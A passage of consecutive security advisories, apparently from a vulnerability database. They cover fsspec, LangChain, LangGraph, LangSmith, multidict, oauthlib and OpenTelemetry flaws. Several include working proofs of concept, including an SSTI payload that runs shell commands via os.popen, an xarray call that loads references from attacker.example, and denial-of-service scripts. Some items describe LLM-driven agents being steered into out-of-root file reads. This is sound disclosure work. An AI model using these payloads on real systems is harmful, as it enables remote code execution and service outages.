### Summary  `fsspec.implementations.reference.ReferenceFileSystem` parses a "references" JSON document (Kerchunk format) supplied either inline or via a URL. The parser renders fields from this JSON through **un-sandboxed** `jinja2.Template(...).render(...)` calls in three locations. An attacker who controls the JSON document — typically by hosting it at a URL that the victim opens with `fsspec.filesystem("reference", fo=URL)` or via `xarray.open_dataset("reference://...")` — achieves arbitrary Python code execution on the victim machine, before any data is read.  This mirrors the pattern of [CVE-2024-34359](https://nvd.nist.gov/vuln/detail/CVE-2024-34359) in `llama-cpp-python`, where externally-sourced template strings were rendered with the default unrestricted Jinja2 environment.  ### Affected versions  All versions of `fsspec` from `0.9.0` onward (vulnerable code introduced in commit `0fb8d56b684ee74ad9ad4587fd560bde1b116450`, 2021-03-12). Confirmed on the latest released version `2025.10.0`.  ### Affected sinks  All in `fsspec/implementations/reference.py`:  | Sink | Location | Trigger | |---|---|---| | A — `_process_references1._render_jinja` | lines 1016-1018 | `simple_templates=False` and a `refs` entry contains `{{` | | B — `_process_templates` (lambda) | lines 1043-1053 | `templates` dict has values containing `{{`, invoked later via render context | | C — `_process_gen` | lines 1075-1083 | references JSON contains a `gen` array (always reached, regardless of `simple_templates`) |  Sink C is the most severe: it is reached unconditionally for any references JSON that includes a `gen` field.  The vulnerable code:  ```python # fsspec/implementations/reference.py # Sink A @lru_cache(1000) def _render_jinja(u):     return jinja2.Template(u).render(**self.templates)  # <- unsandboxed  # Sink B def _process_templates(self, tmp):     ...     for k, v in tmp.items():         if "{{" in v:             import jinja2             self.templates[k] = lambda temp=v, **kwargs: jinja2.Template(                 temp                                       # <- unsandboxed             ).render(**kwargs)  # Sink C def _process_gen(self, gens):     ...     for pr in products:         import jinja2         key = jinja2.Template(gen["key"]).render(**pr, **self.templates)        # <- unsandboxed         url = jinja2.Template(gen["url"]).render(**pr, **self.templates)        # <- unsandboxed         if ("offset" in gen) and ("length" in gen):             offset = int(jinja2.Template(gen["offset"]).render(...))            # <- unsandboxed             length = int(jinja2.Template(gen["length"]).render(...))            # <- unsandboxed ```  ### Proof of concept (Sink C, minimal)  Save as `poc.py`:  ```python import http.server, json, socketserver, threading, time, fsspec from pathlib import Path  PAYLOAD = "{{ joiner.__init__.__globals__.os.popen('touch /tmp/fsspec_pwned_$(whoami)').read() }}" REF = {     "version": 1, "templates": {}, "refs": {"x": "x"},     "gen": [{         "key": PAYLOAD + "/{{ i }}", "url": "http://example.com/{{ i }}",         "offset": "0", "length": "0", "dimensions": {"i": [0]},     }], }  body = json.dumps(REF).encode() class H(http.server.BaseHTTPRequestHandler):     def do_GET(self):         self.send_response(200); self.end_headers(); self.wfile.write(body)     def log_message(self, *a, **kw): pass  srv = socketserver.TCPServer(("127.0.0.1", 0), H) threading.Thread(target=srv.serve_forever, daemon=True).start() url = f"http://127.0.0.1:{srv.server_address[1]}/refs.json"  for p in Path("/tmp").glob("fsspec_pwned_*"): p.unlink() try:     fsspec.filesystem("reference", fo=url) except Exception as e:     print("exception:", e) srv.shutdown() time.sleep(0.3) print("markers:", list(Path("/tmp").glob("fsspec_pwned_*"))) ```  Run:  ``` pip install fsspec aiohttp requests jinja2 python3 poc.py # → markers: [PosixPath('/tmp/fsspec_pwned_<user>')] ```  ### End-to-end via xarray (real-world consumer pathway)  ```python import xarray as xr ds = xr.open_dataset(     "reference://",     engine="zarr",     backend_kwargs={         "consolidated": False,         "storage_options": {             "fo": "http://attacker.example/refs.json",             "remote_protocol": "http",         },     }, ) # RCE fires before any data is materialised. ```  ### Tested on  - fsspec 2025.10.0, jinja2 3.1.6, Python 3.9, macOS 14 - fsspec 2025.10.0, jinja2 3.1.6, Python 3.12-slim, Docker Linux  ### Impact  `fsspec.ReferenceFileSystem` is the canonical entrypoint for the **Kerchunk** format, widely used in the Pangeo / Earth-observation / climate data-science ecosystem to provide cloud-optimised views of HDF5 / NetCDF / GRIB archives hosted on object storage.  Realistic attack vectors:  - A user opens a community-shared Kerchunk catalogue link via xarray/dask. - A managed data-science platform (notebook server, batch job runner)   ingests user-submitted Kerchunk URLs. - A workflow downloads a catalogue from a bucket whose contents have   been tampered with (supply chain).  In every case, the victim performs no action beyond opening a "reference filesystem" — there is no documented expectation that a data catalogue can execute arbitrary Python code.  ### Suggested fix  Replace `jinja2.Template(...)` with a shared `jinja2.sandbox.ImmutableSandboxedEnvironment` for all three sinks. This matches the post-incident hardening applied to `llama-cpp-python` after CVE-2024-34359.  ```python # At module top def _sandboxed_env():     import jinja2.sandbox     env = getattr(_sandboxed_env, "_env", None)     if env is None:         env = jinja2.sandbox.ImmutableSandboxedEnvironment()         _sandboxed_env._env = env     return env ```  Then in each sink, replace `jinja2.Template(s).render(...)` with `_sandboxed_env().from_string(s).render(...)`.  The legitimate Kerchunk template syntax (simple variable substitution like `{{ varname }}`) continues to work under the sandbox; only the SSTI gadgets (`__class__`, `__init__.__globals__`, `__subclasses__`, etc.) are refused with `jinja2.exceptions.SecurityError`.  A complete patch is available on request.  ### Credit  Reported by Dany.A

## Summary  Several LangChain components that resolve filesystem paths or expand search patterns do not consistently confine the *resolved* path to the intended root directory. Affected behaviors include: a file-search agent middleware that validates a starting directory but not the search pattern or the resolved target of matched files, so glob patterns and symlinks can reach files outside the configured root; prompt- and chain/agent-configuration loaders that accept path fields and resolve them without confining the result to a trusted base or rejecting symlink targets; and path-prefix authorization checks that compare by string prefix without a path-segment boundary, so a sibling path sharing the prefix is accepted. When these components receive path values, search patterns, or workspace contents influenced by an untrusted source — including an LLM acting on untrusted input — the result can be disclosure of files outside the intended boundary. We have no evidence of this behavior being triggered in the wild.  ## Affected users / systems  You may be affected if you expose an agent with filesystem-search middleware over a directory and accept prompts or retrieved content influenced by untrusted sources; load prompt or chain/agent configuration from untrusted or shared sources; or rely on path-prefix restrictions to confine tool file access. Callers that confine these components to fully trusted inputs and first-party configuration are not affected.  ## Impact  - Confidentiality: disclosure of file contents outside the intended root/sandbox. - Authorization: path-prefix bypass can grant access to sibling resources beyond the intended subtree.  ## Patches / mitigation  The affected components will canonicalize candidate paths (resolving symlinks) and verify the resolved real path remains within the configured root before reading or returning it; search patterns will be normalized so they cannot escape the root; configuration loaders will confine resolved path fields and reject symlink escapes unless the caller explicitly opts in to dangerous loading; and path-prefix checks will enforce a path-segment boundary. Path validation will be made operating-system-portable.  ## Compatibility  Callers that already pass only in-root paths, validated configuration, and trusted search inputs see no behavioral change. Callers that intentionally reference external paths can opt in via the existing dangerous-loading flag.  ## Operational guidance  Confine filesystem-backed agent tools to a dedicated directory and prefer running them sandboxed/containerized; validate path and identifier inputs where untrusted input enters; do not enable dangerous loading for configuration whose origin you do not control.  ## LangSmith / hosted deployments note  This issue concerns library components executed by agents.

LangChain is a framework for building agents and LLM-powered applications. Prior to 1.3.9, several LangChain components that resolve filesystem paths or expand search patterns do not consistently confine the resolved path to the intended root directory. Affected behaviors include: a file-search agent middleware that validates a starting directory but not the search pattern or the resolved target of matched files, so glob patterns and symlinks can reach files outside the configured root; prompt- and chain/agent-configuration loaders that accept path fields and resolve them without confining the result to a trusted base or rejecting symlink targets; and path-prefix authorization checks that compare by string prefix without a path-segment boundary, so a sibling path sharing the prefix is accepted. When these components receive path values, search patterns, or workspace contents influenced by an untrusted source — including an LLM acting on untrusted input — the result can be disclosure of files outside the intended boundary. This vulnerability is fixed in 1.3.9.

## Summary  LangGraph's `JsonPlusSerializer` can reconstruct Python objects from JSON checkpoint payloads. Under conditions where someone could modify checkpoint bytes at rest in the backing store, the deserialization path could reconstruct objects beyond what the application expects, which could in turn result in code execution at checkpoint load time.  This is a defense-in-depth issue. The affected behavior is reachable only when checkpoint bytes at rest in the backing store can be modified by an unauthorized party. In most deployments that prerequisite already implies a serious incident; the additional concern is turning "checkpoint-store write access" into code execution in the application runtime.  There is no evidence of this behavior being triggered in the wild, and the team is not aware of a practical path to it in existing deployments today. This change is intended to reduce the surface available after a checkpoint-store incident.  ## Affected users / systems  Users may be affected if they:  - use a persistent checkpointer (database, remote store, shared filesystem, etc.) with the default `JsonPlusSerializer`, - load/resume from checkpoints, and - operate in an environment where write access to the checkpoint store could be obtained by an unauthorized party.  The default checkpoint serializer in all shipped checkpointer backends (`PostgresSaver`, `SqliteSaver`, and their async counterparts) is `JsonPlusSerializer`, so applications generally do not need to opt in to be in scope.  ## Impact  - Potential **arbitrary code execution** or other unsafe side effects during checkpoint deserialization. - Escalation from "write access to the checkpoint store" to "code execution in the LangGraph worker process," which may expose runtime secrets or provide access to other systems the runtime can reach.  ## Patches / mitigation  The JSON deserialization path has been narrowed so that revival is restricted to default-constructor reconstruction using the args/kwargs carried in the payload. The framework's own encoder has not relied on the removed behavior for produced checkpoints since the msgpack migration, so this change does not affect freshly written checkpoints. Legacy payloads that already used the default constructor as their first option continue to revive correctly via that same path.  ## Compatibility  A narrow legacy-resume regression applies to pre-October-2025 checkpoints of pydantic models where the original payload depended on a no-validation fallback factory to recover from incompatible schema evolution. After this change, such payloads return `None` from the revival path and fall through to the langchain-core reviver, which surfaces the raw dict rather than reconstructing the model.  ## Operational guidance  - Treat checkpoint stores as integrity-sensitive. Restrict write access and rotate credentials if unauthorized access is suspected. - Avoid providing custom JSON revival hooks that reconstruct arbitrary types unless checkpoint data is fully trusted.  ## LangSmith / hosted deployments note  The team is not aware of this issue presenting concern for existing LangSmith-hosted deployments. The described conditions require modification of the checkpoint persistence layer used by the deployment; typical hosted configurations are designed to prevent such access.  First reported by: pucagit (CyStack).

## Summary  `langgraph-sdk` constructs HTTP request paths for resource operations by interpolating caller-supplied identifier values into URL templates. Without sanitization of those values, identifiers that contain characters with special meaning in URL paths could cause the resulting request to address a different resource (and potentially a different resource type) than the SDK method's call site indicates. In deployments where the SDK receives identifier values that originate from untrusted sources, this could result in unintended access, modification, or deletion of resources beyond the calling user's authorization scope.  This issue is most consequential in deployments that:  - forward end-user-supplied values directly into SDK identifier parameters without first validating them against an expected format (such as a UUID), and - rely on URL-prefix-based authorization at an upstream layer (reverse proxy, edge gateway, WAF), where the authorization decision is made on the SDK call's intended path rather than on the final delivered request path.  There have no evidence of this behavior being triggered in the wild. This change is intended to reduce the surface available when caller-supplied identifier values originate from untrusted sources.  ## Affected users / systems  You may be affected if you:  - use `langgraph-sdk` (Python) to address resources by identifier, and - pass identifier values into SDK methods that originate from end-user input, untrusted third-party callers, or any source that does not validate identifier format before the SDK call.  Applications that validate identifier values (for example, by parsing them as UUIDs and rejecting anything that does not parse) before passing them to SDK methods are not affected. Validated UUIDs round-trip through the SDK request path unchanged.  ## Impact  - Potential **unintended access, modification, or deletion** of resources via SDK methods called for a different resource type, when caller-supplied identifier values are not validated. - In deployments with prefix-based authorization at an upstream layer, the authorization decision and the final delivered request path may diverge. - Confidentiality: disclosure of resource content beyond the authorization scope of the calling user. - Integrity: modification or deletion of resources beyond the authorization scope of the calling user.  ## Patches / mitigation  The SDK now applies path-segment encoding to identifier values before they are interpolated into request URL templates. After this change, identifier values that contain characters with special meaning in URL paths are transmitted as encoded byte sequences and routed to the resource the SDK method's call site indicates.  ## Compatibility  Identifier values that match the standard UUID format, or any other format that contains only characters safe to transmit unencoded in URL path segments, round-trip through the SDK request path unchanged. Applications that already validate identifier inputs see no behavioral change.  ## Operational guidance  - Validate identifier values (typically as UUIDs) at the boundary where untrusted input enters the application, before passing them to SDK methods. - For deployments relying on URL-prefix-based authorization upstream of LangGraph, prefer authorization at the LangGraph server layer or on parsed-and-validated request paths rather than on raw URL prefixes.  ## LangSmith / hosted deployments note  This issue affects the SDK that runs in caller applications. The LangGraph server runtime, including LangSmith-hosted deployments, receives ordinary HTTP requests on documented routes and is not itself affected by this issue. Applications that consume LangSmith-hosted services via `langgraph-sdk` and pass untrusted identifier values to SDK methods should upgrade.  First reported by: pucagit (CyStack).

### Impact _What kind of vulnerability is it? Who is impacted?_ `langgraph-sdk` incorrectly applies the `actions=` argument on resource-scoped authorization decorators, including `@auth.on.threads`, `@auth.on.assistants`, and `@auth.on.crons`.  In affected versions, a decorator such as:  ```python @auth.on.threads(actions=["create"]) async def allow_thread_create(ctx, value):     return None ``` intended to register a handler for selected actions instead registers that handler for every action on the resource. Because the resource-wide handler is selected before broader fallback handlers, authorization checks implemented in those fallback handlers may not run.  An authenticated user may therefore be able to perform actions the application intended to deny, such as reading, updating, or deleting another user's resource. Exploitability and impact depend on the affected handler's behavior: deployments remain protected if that handler independently enforces the necessary action, ownership, or permission checks for every request it receives.  Only Python deployments using `actions=` on the affected resource-scoped decorators are affected.  ### Patches  0.4.4  ### Workarounds  No.  ### References  N/A

# Summary  An attacker who can send an HTTP request to a server running the LangSmith SDK's `TracingMiddleware` can cause that server to read an arbitrary file from its local filesystem and upload the contents to LangSmith as a trace attachment. Depending on how the distributed trace system is deployed, triggering a read may not require authentication. Retrieving the contents requires read access to the LangSmith workspace the traces are sent to. The net effect is a trust-boundary crossing: a party with workspace trace-read access (for example a low-privilege workspace member, a contractor, or a compromised teammate account) gains the ability to read files from any server running `TracingMiddleware`, a capability outside that workspace's intended trust boundary.  # Impact  Confidentiality (High): arbitrary read of files accessible to the server process, exposed to anyone with workspace trace-read access.  # Details  Two defects combine. A field supplied through a tracing-propagation header was merged into the run without validation, allowing injection of run attributes including attachments (CWE-346). A type check intended to gate filesystem access did not match the type of the decoded input, so the guard never engaged (CWE-843). As a result, an attacker-named file is opened by the server and uploaded as a trace attachment by the background tracing thread (CWE-22).  ## Who can exploit this  - Anyone reachable by HTTP can trigger the file read. Depending on how the distributed trace system is deployed, triggering may not require authentication. - Retrieving the file contents requires read access to the destination LangSmith workspace. The upload uses the server's own configured API key and workspace, which the attacker cannot redirect, so a zero-access outsider cannot retrieve the result; a workspace member, or anyone who has compromised one, can.  # Remediation  Upgrade the Python SDK to `>= 0.8.18`.  # Workarounds  Until upgrading, do not expose `TracingMiddleware` to untrusted HTTP traffic, and limit workspace trace-read access to trusted members.  # Credits  First reported by @Ryu7zz.

## Description  A reference leak in the items-view union and subtraction operators of aio-libs/multidict 6.7.0 through 6.9.0 (C extension) lets a remote client drive unbounded, unreclaimable memory growth by having each operand element leak one key-identity object and one value object. The reflected-union path (`operand | d.items()`, `multidict_itemsview_or2_impl`) and the subtraction path (`d.items() - operand`, `multidict_itemsview_sub1_impl`) parse each element into new strong references but release only the tuple wrapper, never the identity and value. Servers in the aio-libs stack build these views over attacker-supplied HTTP headers and query strings, so the operand size is under remote control. Forced garbage collection does not recover the leaked objects, so resident memory rises monotonically until the process is killed.  ---  ## Root Cause  `_multidict_itemsview_parse_item()` returns **new** references: a fresh identity via `md_calc_identity()` and a fresh value via `Py_NewRef()`. The `or2_impl` first parse loop requests both but clears only `arg`:  ```c // views.h:565 — or2_impl first parse loop while ((st = PyIter_NextItem(iter, &arg)) > 0) {     int tmp = _multidict_itemsview_parse_item(         self, arg, &identity, NULL, &value);   // identity + value: new refs     if (tmp < 0) goto fail;     else if (tmp > 0) {         if (_set_add(tmp_set, identity, value) < 0) goto fail;     }     Py_CLEAR(arg);                             // :575 clears arg ONLY } ```  `_set_add()` builds its own tuple with `PyTuple_Pack` and `Py_DECREF`s it, so it never borrows the loop's `identity`/`value`. On the next iteration those variables are overwritten, so the previous references are lost permanently. The `sub1_impl` first loop (`:686-696`) has the identical omission.  This is an editing slip, not an ownership contract: every sibling path clears all three references per iteration, `and1_impl` (`:304-306`), `and2_impl` (`:389-391`), `or1_impl` (`:506-508`), and the second (`md_next`) loops of both functions (`:605-607`, `:726-728`). PR #1413 added a `Py_DECREF(tpl)` to the *second* loop of `or2`/`sub1`, fixing a different temporary-tuple leak; it never touched the first parse loop, so this leak remains on `master`.  `views.h` is byte-identical between `v6.6.0` and `v6.7.0`, yet 6.6.4 does not leak and 6.7.0 does. The regression is behavioural, introduced by a key-identity ownership change in `hashtable.h` across that boundary that made `md_calc_identity()` return a fresh strong reference the unchanged parse loop never releases.  ---  ## Reproduction Environment  | Item | Value | |------|-------| | **Runtime** | CPython 3.14.6 | | **multidict** | 6.9.0 (PyPI binary wheel, C extension) | | **OS** | macOS (darwin 25.6.0, arm64) |  ---  ## Proof of Concept  ### POC Source Code  #### poc_refcount.py — leak proof with intersection control  ```python import sys, gc from multidict import CIMultiDict  def probe(name, run_op):     d = CIMultiDict(); d["seed"] = "x"     value = object()                 # unique sentinel     N = 100000     operand = [("k%d" % i, value) for i in range(N)]     gc.collect(); before = sys.getrefcount(value)     run_op(d, operand)     gc.collect(); after = sys.getrefcount(value)     print(f"[{name}] leaked strong refs = {after - before}")  probe("or2  operand | items", lambda d, o: o | d.items())    # reflected union probe("sub1 items - operand", lambda d, o: d.items() - o)    # subtraction probe("and2 items & operand", lambda d, o: d.items() & o)    # CONTROL: clears, expect 0 ```  #### poc_dispatch.py — maps which paths leak  ```python import sys, gc from multidict import CIMultiDict  def probe(name, fn):     d = CIMultiDict(); d["seed"] = "x"     v = object(); N = 50000     operand = [("k%d" % i, v) for i in range(N)]     gc.collect(); before = sys.getrefcount(v)     fn(d, operand); gc.collect(); after = sys.getrefcount(v)     print(f"{name:35s} leaked={after - before}")  probe("operand | d.items()  (or2)",  lambda d, o: o | d.items()) probe("d.items() | operand  (or1)",  lambda d, o: d.items() | o) probe("d.items() - operand  (sub1)", lambda d, o: d.items() - o) probe("operand - d.items()  (rsub)", lambda d, o: set(o) - d.items()) probe("d.items() & operand  (and)",  lambda d, o: d.items() & o) ```  #### poc_rss.py — availability consequence  ```python import sys, gc, resource from multidict import CIMultiDict  def rss_mb():     r = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss     return r / (1024 * 1024) if sys.platform == "darwin" else r / 1024  d = CIMultiDict(); d["seed"] = "x" gc.collect(); print(f"start RSS = {rss_mb():.1f} MB") for i in range(200):     operand = [(f"k{i}_{j}", f"v{i}_{j}") for j in range(50000)]     _ = operand | d.items()     del operand     gc.collect()                     # prove GC cannot reclaim the leak     if (i + 1) % 40 == 0:         print(f"after {(i+1)*50000:>9,} elements: RSS = {rss_mb():.1f} MB") ```  ### Execution Steps  1. `python3 -m venv venv` (CPython 3.10+). 2. `./venv/bin/pip install "multidict==6.9.0"` (installs the C-extension wheel). 3. From a directory that is **not** a multidict checkout, run each script with `./venv/bin/python`.  ### Actual Execution Evidence  ``` [or2  operand | items] leaked strong refs = 100000 [sub1 items - operand] leaked strong refs = 100000 [and2 items & operand] leaked strong refs = 0        <- control ```  ``` operand | d.items()  (or2)          leaked=50000 d.items() | operand  (or1)          leaked=0 d.items() - operand  (sub1)         leaked=50000 operand - d.items()  (rsub)         leaked=0 d.items() & operand  (and)          leaked=0 ```  ``` start RSS = 15.6 MB after 2,000,000 elements: RSS = 288.1 MB after 6,000,000 elements: RSS = 776.8 MB after 10,000,000 elements: RSS = 1266.8 MB   (gc.collect() every iteration) ```  ### Version-boundary evidence  Same `poc_dispatch.py`, PyPI wheels, identical environment. Last-clean is `6.6.4`; first-affected is `6.7.0`:  ``` 6.6.4 : or2=0      sub1=0      others=0   (clean, last 6.6.x) 6.7.0 : or2=50000  sub1=50000  others=0   (AFFECTED, first) 6.9.0 : or2=50000  sub1=50000  others=0   (affected) ```  The clean 6.6.x releases return correct set-operation results, so the zero leak reflects correct memory management, not a broken path.  ### Analysis of Results  The operand holds exactly `N` references to one sentinel value; after the union its refcount rises by another `N` and stays there post-GC, so each element leaked one strong reference. Subtraction shows the identical delta. The intersection control, which clears `identity` and `value`, leaks zero; the only code difference is the two missing `Py_CLEAR` calls, so the leak is caused by that omission and not the harness. RSS climbs from 15.6 MB to 1266.8 MB (~250 MB per 2M elements) despite per-iteration GC, confirming the objects are unreachable by the cyclic collector.  ---  ## Impact  A process that evaluates items-view unions or subtractions over remote-influenced operands leaks one identity plus one value object per element, permanently. In the aio-libs stack multidict backs HTTP headers and query strings, so an attacker who enlarges the operand (for example, many repeated header items compared against a fixed allow/deny set) forces steady, unrecoverable heap growth and can eventually exhaust memory in a long-lived server. This is an availability defect only; results stay correct and no data is exposed.  Reachability depends on the application evaluating `operand | view.items()` (reflected union) or `view.items() - operand` (subtraction) over a sequence of 2-tuples whose count is remote-influenced. The forward union `view.items() | operand` routes to `or1_impl`, which clears correctly and does not leak; a non-tuple operand element takes the `parse_item` early-return and does not leak. Set algebra over items views is not the most common multidict usage, which bounds exposure and is why this is Medium, not High. This is distinct from PR #1413, which fixed a temporary-tuple leak in the second loop and did not release these per-element objects.  ---  ## Remediation  **Recommended fix.** Clear the two per-element references at the end of the first parse loop in both functions, exactly as every sibling path does. In `or2_impl` (`views.h:575`) and `sub1_impl` (`views.h:696`), replace the lone `Py_CLEAR(arg);` with:  ```c     Py_CLEAR(arg);     Py_CLEAR(identity);     Py_CLEAR(value); ```  This is an in-repo change to a static internal function; it alters no public API, type, or signature, and asks callers to change nothing. A leak test in the existing `tests/test_leaks.py` style would lock it in.  **Workaround.** Avoid `operand | view.items()` and `view.items() - operand` on attacker-influenced operands, or install with `MULTIDICT_NO_EXTENSIONS=1` to use the unaffected pure-Python build.  ---

## Summary  A timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation  of the Authorization Code Grant flow. The `code_challenge_method_plain` function  uses Python's standard `==` operator for string comparison instead of a  constant-time comparison function, potentially allowing timing-based attacks.  ## Affected Component  - File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py` - Functions: `code_challenge_method_plain`, `code_challenge_method_s256` - Vulnerability Type: CWE-208 (Observable Timing Discrepancy)  ## Technical Details  Python's `==` operator uses short-circuit evaluation when comparing strings: 1. Returns `False` immediately if lengths differ 2. Compares characters left-to-right, stopping at first mismatch  This means comparison time varies linearly with the length of the common prefix  between the attacker-supplied verifier and the stored challenge, creating a  measurable timing oracle.  ## Proof of Concept  Tested locally against oauthlib source (network jitter eliminated to isolate  pure Python execution time):  | Input | Result | Time (10M iterations) | |---|---|---| | Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s | | 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s | | **Difference** | | **0.03741s** |  The ~37ms delta over 10M iterations corresponds to nanosecond-level differences  per call, which are statistically exploitable under controlled conditions.  ## Attack Scenario  1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking 2. PKCE blocks token request — attacker lacks `code_verifier` 3. Attacker sends repeated requests to `/token` endpoint measuring response times 4. Using timing oracle, attacker recovers `code_verifier` character by character 5. Attacker obtains Access Token → Account Takeover  > **Note:** Practical exploitability is limited due to the single-use nature of  > authorization codes and real-world network noise. However, the vulnerable  > pattern should be corrected as a defense-in-depth measure.  ## Recommended Fix  Replace `==` with `hmac.compare_digest()` for constant-time comparison:  cr: Elvin Latifli

### Summary A call to the token endpoint with a grant type of `"urn:ietf:params:oauth:grant-type:device_code"` and a bogus `device_code` is able to get a bearer token as long as they know a valid client ID enabled for the device workflow.  ### Details  [Section 3.4 of the RFC 8628 spec](https://datatracker.ietf.org/doc/html/rfc8628#section-3.4) says that the token endpoint should take in `device_code` as a required parameter.`DeviceCodeGrant.validate_token_request` does not perform any validation of `device_code`. `DeviceCodeGrant.validate_token_request` should be validating that `device_code` was passed in as a parameter and that it is valid, similar to how `AuthorizationCodeGrant.validate_token_request` does the checks [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L446) and [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L483).  I would like to propose a new method be added to `RequestValidator` called `validate_device_code` that is similar to the `validate_code` method and is called inside of `DeviceCodeGrant.validate_token_request`.  ### PoC Create an implementation of `RequestValidation.authenticate_client` that returns `True` if the client's `client_type` is `"public"`. You would find yourself in this scenario because there's another issue with `DeviceCodeGrant.validate_token_request` where it doesn't properly handle public clients (see https://github.com/oauthlib/oauthlib/issues/919).  Create a client that has a `client_type` of `"public"` and set it's `grant_type` to `"urn:ietf:params:oauth:grant-type:device_code"`.  With this implementation of `RequestValidation.authenticate_client` done, use that validator for your token endpoint. Call the token endpoint with a body of  ``` {   "client_id": <ID of the public client you made>,   "grant_type": "urn:ietf:params:oauth:grant-type:device_code",   "device_code": <anything you want since it's not validated> } ```  You now have a bearer token for the client without a valid `device_code`.   ### Impact Anyone using the RFC 8628 device workflow in oauthlib that doesn't realize the `device_code` parameter is not being validated.

## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r"[ 	]*,[ 	]*")      # <-- (line 46) starts with an unbounded [ 	]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     "Member doesn't match the w3c identifiers format %s",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ 	]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f"x{elapsed / previous:.1f}" if previous else "-"     print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `" "` with `"	"` to see ≈1.6× longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})     await send({"type": "http.response.body", "body": b"ok"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python """Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.""" import socket import sys import threading import time  HOST, PORT = "127.0.0.1", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = 